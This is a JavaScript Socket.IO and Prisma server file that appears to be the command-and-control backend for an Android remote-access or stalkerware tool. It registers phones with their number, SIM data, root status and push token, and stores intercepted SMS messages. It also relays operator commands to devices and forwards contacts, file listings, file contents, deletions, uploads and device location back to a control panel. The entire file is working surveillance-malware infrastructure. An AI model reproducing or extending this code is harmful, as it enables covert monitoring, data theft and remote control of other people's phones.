import { Server } from "socket.io";
import { PrismaClient } from "@prisma/client";

const prisma = new PrismaClient();
let ioInstance = null;
let activeConnections = [];

// Module-scope shared map so that a panel's "register_panel_request" and a
// device's "file_list_result" / "file_data" can find each other regardless of
// which physical socket each side is connected on. Without this, each socket
// has its own private Map and device responses can never be routed back.
const pendingPanelRequests = new Map();

export const initSocketServer = (httpServer) => {
  const io = new Server(httpServer);
  ioInstance = io;

  function getSocketsForUser(userId) {
    return activeConnections
      .filter((conn) => conn.userId === userId)
      .map((conn) => conn.socketId);
  }

  function emitToUser(userId, event, data) {
    const sockets = getSocketsForUser(userId);
    sockets.forEach((socketId) => {
      io.to(socketId).emit(event, data);
    });
    console.log(
      `Emitted ${event} to ${sockets.length} sockets for user ${userId}`
    );
  }

  const upsertDevice = async (socket) => {
    try {
      const query = socket.handshake.query || {};
      const { userId, deviceId, modelName } = query;
      console.log(`[upsertDevice] sid=${socket.id} userId=${userId} deviceId=${deviceId} modelName=${modelName}`);
      const ipAddress =
        socket.handshake.address ||
        socket.handshake.headers["x-forwarded-for"] ||
        socket.handshake.remoteAddress;

      if (!userId || !deviceId || !modelName) {
        throw new Error(
          `Missing required fields: userId=${userId}, deviceId=${deviceId}, modelName=${modelName}`
        );
      }
      const simData =
        typeof query.simData === "string"
          ? JSON.parse(query.simData)
          : query.simData || [];

      const cleanData = {
        deviceId,
        socketId: socket.id,
        modelName,
        androidV: query.androidV || "",
        isRoot: query.isRoot === "true",
        isSdCard: query.isSdCard === "true",
        storage: query.storage || "",
        sdkV: query.sdkV || "",
        cpu_arch: query.cpu_arch || "",
        battery: query.battery || "",
        ipAddress,
        service_provider: query.service_provider || "",
        mobNo: query.mobNo || "",
        lastSeen: new Date(),
        FCM_Token: query.fcm_token || "",
        isReadCallLogs: query.isReadCallLogs === "true",
        isReadContacts: query.isReadContacts === "true",
        simData: Array.isArray(simData) ? simData : [],
        status: true,
        
        user: { connect: { id: userId } },
      };

      const existingDevice = await prisma.clientDevice.findFirst({
        where: { userId, deviceId },
      });

      let device;
      if (existingDevice) {
        console.log(`[upsertDevice] found existing, updating with new socketId=${socket.id}`);
        try {
          device = await prisma.clientDevice.update({
            where: { id: existingDevice.id },
            data: cleanData,
          });
          console.log(`[upsertDevice] updated successfully`);
        } catch (e) {
          console.error(`[upsertDevice] update FAILED:`, e.message);
        }
      } else {
        console.log(`[upsertDevice] creating new device`);
        device = await prisma.clientDevice.create({ data: cleanData });
        emitToUser(userId, "device_created", device);
      }
      emitToUser(userId, "device_updated", device);
    } catch (error) {
      try {
        const query = socket.handshake.query || {};
        const ipAddress =
          socket.handshake.address ||
          socket.handshake.headers["x-forwarded-for"] ||
          socket.handshake.remoteAddress;
        await prisma.tempDevice.create({
          data: {
            socketId: socket.id,
            ipAddress,
            userId: query.userId || null,
          },
        });
      } catch (tempError) {}
    }
  };

  const handleDisconnect = async (socket) => {
    try {
      const tempDevice = await prisma.tempDevice.findUnique({
        where: { socketId: socket.id },
      });

      if (tempDevice) {
        await prisma.tempDevice.delete({ where: { socketId: socket.id } });
      } else {
        const query = socket.handshake.query || {};
        const { userId, deviceId } = query;
        if (userId && deviceId) {
          const updatedDevice = await prisma.clientDevice.update({
            where: { userId, deviceId },
            data: { status: false, socketId: null },
          });
          emitToUser(userId, "device_updated", updatedDevice);
        }
      }
    } catch (error) {
      console.error("Disconnect handler error:", error);
    }
  };

  io.of("/").on("connection", async (socket) => {
    const { type, userId } = socket.handshake.query;
    const ipAddress =
      socket.handshake.address ||
      socket.handshake.headers["x-forwarded-for"] ||
      socket.handshake.remoteAddress;

    console.log(
      "New connection:",
      socket.id,
      "Type:",
      type,
      "User ID:",
      userId || "N/A",
      "IP:",
      ipAddress
    );

    try {
      if (type === "frontend") {
        console.log("Frontend client connected");
        if (userId) {
          const connection = {
            socketId: socket.id,
            userId: userId,
            type: type,
            ipAddress: ipAddress,
            connectedAt: new Date(),
          };

          activeConnections.push(connection);
          console.log("Active connections:", activeConnections.length);
        }
      } else {
        await upsertDevice(socket);
      }
    } catch (error) {
      console.error("Connection handler error:", error);
    }

    socket.on("disconnect", async () => {
      console.log("Client disconnected:", socket.id);

      try {
        if (type === "frontend") {
          const index = activeConnections.findIndex(
            (conn) => conn.socketId === socket.id
          );
          if (index !== -1) {
            activeConnections.splice(index, 1);
            console.log(
              "Removed connection. Active:",
              activeConnections.length
            );
          }
        }
        if (type !== "frontend") {
          await handleDisconnect(socket);
        }
      } catch (error) {
        console.error("Disconnect error:", error);
      }
    });

    socket.on("battery_level_Changed", async (batteryData) => {
      try {
        const { DeviceId, UserId, battery_Level, timestamp } = batteryData;
        if (!DeviceId || !UserId || !battery_Level) {
          throw new Error("Missing required battery data fields");
        }
        const updatedDevice = await prisma.clientDevice.update({
          where: { deviceId: DeviceId, userId: UserId },
          data: {
            battery: battery_Level.toString(),
            lastSeen: new Date(timestamp || new Date()),
          },
        });
        emitToUser(UserId, "device_updated", updatedDevice);
      } catch (error) {
        console.error("Battery update error:", error);
      }
    });

    socket.on("received_message", async (messageData) => {
      try {
        const { DeviceId, userId, sender, textMessage, type, timestamp } =
          messageData;
        if (!DeviceId || !userId || !sender || !textMessage) {
          throw new Error("Missing required message fields");
        }
        const message = await prisma.smsMessage.create({
          data: {
            sender,
            textMessage,
            type: type || "incoming",
            timestamp: timestamp ? new Date(timestamp) : new Date(),
            device: { connect: { deviceId: DeviceId } },
            user: { connect: { id: userId } },
          },
        });
        emitToUser(userId, "new_message", message);
      } catch (error) {
        console.error("Message handling error:", error);
      }
    });

    socket.on("server_command_to_user", async (commandData) => {
      try {
        const { socketId, toClient, user_id, device_id } = commandData;
        if (!device_id || !user_id || !socketId || !toClient) {
          throw new Error("Missing required message fields");
        }
        console.log(`[server] server_command_to_user: action=${commandData?.command?.action} -> toClient=${toClient} sid=${socketId}`);
        io.to(toClient).emit("server_command", commandData);
      } catch (error) {
        console.error("Message handling error:", error);
      }
    });

    socket.on("cleint_action_info_to_user", async (actionInfoData) => {
      try {
        const { toClient, UserId, DeviceId } = actionInfoData;
        if (!DeviceId || !UserId || !toClient) {
          throw new Error("Missing required message fields");
        }

        io.to(toClient).emit("cleint_action_info", actionInfoData);
      } catch (error) {
        console.error("Message handling error:", error);
      }
    });

    socket.on("phone_action_info", async (ContactInfoData) => {
      try {
        const { toClient, UserId, DeviceId } = ContactInfoData;
        if (!DeviceId || !UserId || !toClient) {
          throw new Error("Missing required message fields");
        }

        io.to(toClient).emit("contact_info", ContactInfoData);
      } catch (error) {
        console.error("Message handling error:", error);
      }
    });

    // Pending panel requests are now in module scope (see top of file) so
    // device and panel sockets share the same Map.
    socket.on("register_panel_request", ({ socketId, panelSocketId }) => {
      if (!socketId || !panelSocketId) return;
      pendingPanelRequests.set(socketId, {
        panelSocketId,
        deviceSocketId: socket.id,
        createdAt: Date.now(),
      });
      // Auto-expire after 5 minutes so the map doesn't grow unbounded.
      setTimeout(() => pendingPanelRequests.delete(socketId), 5 * 60 * 1000);
    });

    const forwardToPanel = (eventName) => (payload) => {
      try {
        if (!payload || !payload.socketId) {
          console.log(`[forward:${eventName}] dropped: no payload.socketId`);
          return;
        }
        const pending = pendingPanelRequests.get(payload.socketId);
        if (pending) {
          io.to(pending.panelSocketId).emit(eventName, payload);
          console.log(`[forward:${eventName}] -> panel=${pending.panelSocketId} via sid=${payload.socketId}`);
        } else {
          // Fallback: pending entry missing (race / TTL expiry / panel
          // reconnected). The device's socket.id is in this closure scope
          // (the handler is bound to the device's socket on line 353).
          // Broadcast the result to all live frontend sockets for that
          // device's user.
          const deviceSocketId = socket.id;
          (async () => {
            try {
              const dev = await prisma.clientDevice.findFirst({
                where: { socketId: deviceSocketId },
              });
              if (!dev) {
                console.log(`[forward:${eventName}] fallback: no device row for socket=${deviceSocketId}`);
                return;
              }
              const targets = activeConnections
                .filter((c) => c.userId === dev.userId)
                .map((c) => c.socketId);
              targets.forEach((sid) => io.to(sid).emit(eventName, payload));
              console.log(`[forward:${eventName}] fallback -> ${targets.length} panel(s) for user=${dev.userId} (sid=${payload.socketId} unknown, deviceSocket=${deviceSocketId})`);
            } catch (e) {
              console.error(`[forward:${eventName}] fallback error:`, e.message);
            }
          })();
        }
        if (eventName === "unzip_result" && pending) {
          pendingPanelRequests.delete(payload.socketId);
        }
      } catch (err) {
        console.error(`${eventName} forward error:`, err);
      }
    };

    socket.on("file_list_result", forwardToPanel("file_list_result"));
    socket.on("file_data", forwardToPanel("file_data"));
    socket.on("file_delete_result", forwardToPanel("file_delete_result"));
    socket.on("file_upload_result", forwardToPanel("file_upload_result"));
    socket.on("unzip_result", forwardToPanel("unzip_result"));
    socket.on("device_location", forwardToPanel("device_location"));

    socket.on("client_log", (data) => {
      console.log("Client log:", data);
    });
  });

  return io;
};

export const getSocketInstance = () => {
  if (!ioInstance) {
    throw new Error("Socket.IO server not initialized!");
  }
  return ioInstance;
};
